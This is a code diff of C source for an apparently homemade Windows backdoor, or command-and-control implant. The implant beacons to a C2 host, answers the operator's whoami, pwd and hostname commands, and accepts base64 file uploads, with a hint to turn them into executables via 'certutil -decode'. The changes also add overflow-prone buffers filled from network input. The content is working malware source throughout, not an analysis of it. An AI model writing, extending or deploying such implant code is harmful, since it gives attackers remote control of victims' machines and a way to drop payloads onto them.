@@ -129,8 +129,8 @@ char* b64_decode(const char *in)
 
     size_t outlen;
     outlen = b64_decoded_size(in);
-
-    char   *out;
+    
+	char   *out;
     out  = (char *)malloc(outlen+1);
 	out[outlen] = '\0';
 
@@ -190,7 +190,7 @@ DWORD getpid(){
 int upload(char * filename, char * content){
 	errno = 0;
 	FILE *outfile;
-	outfile = fopen(filename, "wb");
+	outfile = fopen(filename, "w");
 	if (!outfile) {
 		return errno;
 	}
@@ -329,7 +329,7 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			memset(RecvData, 0, sizeof(RecvData));
 		}
 		else if (strcmp(command, "whoami\n") == 0) {
-			char buffer[257] = ""; // reserve buffer with length of 257 bytes
+			char buffer[255] = ""; // reserve buffer with length of 257 bytes
 			whoami(buffer); // call whoami function
 			strcat(buffer, "\n"); 
 
@@ -340,7 +340,7 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 		}
 		// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
 		else if (strcmp(command, "pwd\n") == 0) {
-			char buffer[257] = "";
+			char buffer[255] = "";
 			pwd(buffer);
 			strcat(buffer, "\n");
 
@@ -350,7 +350,7 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			memset(RecvData, 0, sizeof(RecvData));
 		}
 		else if (strcmp(command, "hostname\n") == 0) {
-			char buffer[257] = "";
+			char buffer[255] = "";
 			hostname(buffer);
 			strcat(buffer, "\n"); 
 			
@@ -378,29 +378,40 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			
 			// Parse filename and contents
 			char * filename = strtok(NULL, delim);
-			char * b64_contents = strtok(NULL, delim);
-			// this needed to trim new line from the end, so base64 can be parsed correctly further
-			b64_contents = strtok(b64_contents,"\n");
+			char * data_length = strtok(NULL, delim);
+			int data_length_int = atoi(data_length);
 			
-			size_t filesize = b64_decoded_size(b64_contents);
-			char * contents = (char *)malloc(filesize);
-			contents  = b64_decode(b64_contents);
-
-			printf("[CnC] decoded data: %s\n", contents);
+			// receiving data
+			char base64file[data_length_int];
+			memset(base64file, 0, sizeof(base64file));
+			
+			char buffer[255] = "";
+			strcat(buffer, "[!] Saving file in Base64 format as ");
+			strcat(buffer, filename);
+			strcat(buffer, "\n");
+			strcat(buffer, "    Decode it using:\n\n\tcertutil -decode c:\\foo.asc c:\\foo.exe");
+			
+			send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+			
+			int RecvCode = recv(tcpsock, base64file, data_length_int, 0);
+			if (RecvCode <= 0){
+				closesocket(tcpsock);
+				WSACleanup();
+				return;
+			}
 
 			// uploading
 			int result;
-			result = upload(filename,contents);
-
+			result = upload(filename,base64file);
+			
 			// C&C part
-			char buffer[255];
 			memset(buffer, 0, sizeof(buffer));
 			if (result == 0) {
-				strcat(buffer,"\nUploaded "); 
+				strcat(buffer,"\n[+] Uploaded: "); 
 				strcat(buffer,filename); 
 			}
 			else { 
-				strcat(buffer,"Failed to write file. Errno from fopen: "); 
+				strcat(buffer,"\n[-] Failed to write file. Errno from fopen: "); 
 				// parse errno
 				char errnos[2];
 				memset(errnos,0,2);
@@ -411,7 +422,7 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			
 			send(tcpsock,buffer,strlen(buffer)+1,0);
 			// clear buffers
-			memset(contents, 0, sizeof(contents));
+			memset(base64file, 0, sizeof(base64file));
 			memset(buffer, 0, sizeof(buffer));
 			memset(RecvData, 0, sizeof(RecvData)); 
 		}
@@ -480,7 +491,6 @@ int main(int argc, char **argv)
 				// BEACONING
 				// NEED TO IMPLEMENT RANDOM DELAY
 				Sleep(1000); // 1000 ms = 1s
-
 				Connect(argv[1],port);
 		}
 	} else {
@@ -490,7 +500,6 @@ int main(int argc, char **argv)
 				// BEACONING
 				// NEED TO IMPLEMENT RANDOM DELAY
 				Sleep(1000); // 1000 ms = 1s
-
 				Connect(host,port);
 		}
 	}
